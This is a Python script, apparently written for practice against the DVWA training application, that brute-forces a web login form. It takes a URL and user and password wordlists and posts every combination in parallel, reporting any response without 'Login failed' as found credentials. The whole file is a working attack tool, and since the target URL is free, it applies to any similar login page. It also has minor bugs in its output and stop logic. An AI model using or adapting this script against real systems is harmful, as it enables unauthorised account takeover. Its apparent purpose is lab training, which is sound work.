import multiprocessing
import requests
import optparse
import sys
import os
import termcolor

class DVWALoginBruteForce:
    def __init__(self) -> None:
        self.url = self.url_prefix(self.get_params()[0])
        self.userlist = self.get_params()[1]
        self.passlist = self.get_params()[2]

    def get_params(self):
        parser = optparse.OptionParser('Usage: ./%s -u url -L user wordlist -p password wordlist' % sys.argv[0])
        parser.add_option('-u', '--url', dest='url', type='string', help='Specify url')
        parser.add_option('-L', '--userlist', dest='userlist', type='string', help='Specify user wordlist')
        parser.add_option('-p', '--passwordlist', dest='passlist',type='string', help='Specify password wordlist')
        options, args = parser.parse_args()
        if options.url is None or options.userlist is None or options.passlist is None:
            print(parser.usage)
            sys.exit()
        if not os.path.exists(options.userlist):
            print('Userlist does not exist')
            sys.exit()
        if not os.path.exists(options.passlist):
            print('Password wordlist does not exit')
            sys.exit()
        return options.url, options.userlist, options.passlist
    
    def url_prefix(self, url):
        if url.startswith('http://') or url.startswith('https://'):
            return url
        else:
            return 'http://'+url
    
    def login(self,username, password):
        post_data = {
            'username':username,
            'password':password,
            'Login':'Login'
        }
        try:
            response = requests.post(url=self.url, data=post_data)
            if 'Login failed' not in response.text:
                print('Username and Password Found: %s     %s' % (termcolor.colored(username,'blue'), termcolor.colored(password),'blue'))
                sys.exit()
        except:
            pass
    
    def run(self):
        pool = multiprocessing.Pool(processes=3)
        uf = open(self.userlist,'r')
       
        while True:
            line_user = uf.readline()
            if len(line_user)==0:
                break
            username = line_user.strip()
            if username == "":
                continue
            pf = open(self.passlist, 'r')
       
            while True:
                line_pass = pf.readline()
                if len(line_pass) == 0:
                    break
                password = line_pass.strip()
              
                print('Attempt to login as %s : %s' % (username, password))
                pool.apply_async(self.login,(username, password))
        pool.close()
        pool.join()


if __name__ == '__main__':
    dvwa = DVWALoginBruteForce()
    dvwa.run()

